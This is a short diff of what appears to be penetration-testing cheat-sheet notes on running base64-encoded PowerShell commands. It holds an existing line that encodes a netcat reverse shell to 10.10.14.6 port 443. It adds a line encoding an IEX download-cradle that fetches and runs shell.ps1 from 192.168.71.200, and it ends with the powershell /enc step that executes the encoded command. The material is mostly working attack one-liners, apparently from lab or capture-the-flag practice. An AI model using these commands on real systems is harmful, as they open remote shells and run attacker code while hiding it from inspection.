@@ -30,6 +30,7 @@ powershell run b64'ed commands
 
 ```
 echo 'cmd /c "\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443"' | iconv -f ascii -t utf-16le | base64 -w0
+echo 'IEX(New-Object Net.WebClient).downloadString("http://192.168.71.200/shell.ps1")' | iconv -f ascii -t utf-16le | base64 -w0
 powershell /enc YwBt....
 ```
 
